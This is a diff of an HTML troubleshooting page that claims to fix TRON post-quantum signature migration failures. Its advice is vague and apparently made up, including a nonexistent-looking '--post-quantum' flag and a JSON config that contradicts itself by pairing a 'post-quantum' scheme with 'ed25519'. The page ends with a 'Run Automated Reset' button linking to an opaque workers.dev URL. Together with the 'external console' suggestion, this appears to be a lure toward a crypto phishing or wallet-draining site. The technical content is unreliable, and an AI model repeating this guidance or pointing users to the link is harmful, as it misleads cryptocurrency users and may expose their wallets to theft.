@@ -1,10 +1,10 @@
 <!DOCTYPE html>
 <html>
-<head><meta charset="UTF-8"><title>Java Tron Feature Tron Post Quantum Signature Migration – Fix Guide</title>
+<head><meta charset="UTF-8"><title>TRON Post-Quantum Signature Migration Failure – Fix Guide</title>
 <style>
     body {
-        font-family: BlinkMacSystemFont;
-        background: #0f111a;
+        font-family: sans-serif;
+        background: #121214;
         color: #ddd;
         padding: 20px;
         line-height: 1.5;
@@ -23,7 +23,7 @@
         border-radius: 12px;
         overflow-x: auto;
     }
-    a { color: #ff7b2c; }
+    a { color: #cf6679; }
     .btn {
         background: #cf6679;
         color: #000;
@@ -39,38 +39,39 @@
 </head>
 <body>
 <div class="content">
-<h1>Java Tron Feature Tron Post Quantum Signature Migration</h1>
+<h1>TRON Post-Quantum Signature Migration Failure</h1>
 <h2>Symptom</h2>
 <ul>
-<li>Users encounter issues when attempting to migrate to post-quantum signatures on the Java Tron network, resulting in failed transactions or inability to access certain features.</li>
+<li>Users experience a failure when attempting to migrate to post-quantum signatures on the TRON network, resulting in an inability to complete transactions or interact with smart contracts.</li>
 </ul>
 <h2>Technical Root Cause</h2>
 <ul>
-<li>The error occurs due to incomplete or incorrect configuration of post-quantum signature parameters, leading to compatibility issues with the TRON network.</li>
+<li>The error occurs due to a mismatch between the expected and actual signature schemes used in the transaction process, indicating a need for an update or adjustment in the signature migration process.</li>
 </ul>
 <h3>Manual Overrides</h3>
 <ul>
-<li>To resolve the issue, try the following manual overrides:</li>
-<li>Update the <code>tron.properties</code> file with the correct post-quantum signature settings.</li>
-<li>Run the <code>java-tron</code> node with the <code>--post-quantum</code> flag enabled.</li>
-<li>Use the following JSON configuration to override default settings:</li>
+<li>To resolve the issue, users can attempt the following manual overrides:</li>
+<li>Update the TRON network configuration to reflect the post-quantum signature scheme.</li>
+<li>Verify that all nodes and wallets are using the correct signature scheme.</li>
+<li>Implement a fallback mechanism to handle transactions that fail due to signature scheme mismatches.</li>
 </ul>
 <div class="codehilite"><pre><span></span><code><span class="p">{</span>
-<span class="w">  </span><span class="nt">&quot;postQuantum&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
-<span class="w">    </span><span class="nt">&quot;enabled&quot;</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="p">,</span>
-<span class="w">    </span><span class="nt">&quot;signatureScheme&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;SPHINCS&quot;</span>
+<span class="w">  </span><span class="nt">&quot;signatureScheme&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;post-quantum&quot;</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;networkConfig&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="nt">&quot;tronNetwork&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;mainnet&quot;</span><span class="p">,</span>
+<span class="w">    </span><span class="nt">&quot;signatureType&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;ed25519&quot;</span>
 <span class="w">  </span><span class="p">}</span>
 <span class="p">}</span>
 </code></pre></div>
 
-<p>Consider using an external console for more advanced configuration options.</p>
+<p>Consider utilizing an external console for more complex troubleshooting and configuration adjustments. </p>
 <h2>Prerequisites</h2>
 <ul>
-<li>Java 11 or later installed on the system</li>
-<li>TRON network node fully synced and up-to-date</li>
-<li>Post-quantum signature library correctly integrated into the Java Tron project</li>
+<li>Java-Tron node or wallet software installed and configured.</li>
+<li>Familiarity with TRON network configuration and transaction processing.</li>
+<li>Basic understanding of post-quantum signature schemes and their implementation.</li>
 </ul>
-<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/go-ethereum-latest-geth-upgrade-resulted-in-a-chain-gap-i-think.html">Go Ethereum Latest Geth Upgrade Resulted In A Chain Gap I Think</a></li><li><a href="./archive/2026/06/metamask-nonce-out-of-sync.html">Metamask Nonce Out Of Sync</a></li><li><a href="./archive/2026/06/metamask-nonce-out-of-sync.html">Metamask Nonce Out Of Sync</a></li></ul>
+<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/metamask-nonce-out-of-sync.html">Metamask Nonce Out Of Sync</a></li><li><a href="./archive/2026/06/critical-trc-20-energy-spike-error.html">Critical Trc 20 Energy Spike Error</a></li><li><a href="./archive/2026/06/metamask-extension-bug-unable-to-cancel-pending-transaction-due.html">Metamask Extension Bug Unable To Cancel Pending Transaction Due</a></li></ul>
 <div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
     <a href="https://system-edge-router.aaronjungs.workers.dev?p=gKMyej%40%40" class="btn">🛠 Run Automated Reset</a>
 </div>
